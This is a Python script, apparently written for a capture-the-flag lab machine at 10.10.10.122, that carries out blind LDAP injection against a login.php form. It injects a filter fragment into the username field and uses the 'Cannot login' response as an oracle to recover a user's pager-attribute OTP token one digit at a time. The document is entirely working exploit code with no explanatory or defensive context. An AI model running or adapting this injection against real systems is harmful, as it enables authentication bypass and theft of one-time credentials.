#!/usr/bin/python3

import requests
from time import sleep
from string import digits,ascii_lowercase
import sys

token = ""
attribute= 'pager'
url = 'http://10.10.10.122/login.php'
loop = 1

while loop >0:
    for digit in digits:
        token = token
        query = f'ldapuser%29%28{attribute}%3d{token}{digit}%2a'
                #ldapuser)(pager=<token>*
        data = {'inputUsername' : query , 'inputOTP' : "1234"}
        r = requests.post( url,data=data)
        sys.stdout.write(f'\rToken: {token}{digit}')
        sleep(1)
        if "Cannot login" in r.text:
            token = token+digit
            #print(f'Success: {token}')
            break;

        elif digit == '9':
            loop=0
            break

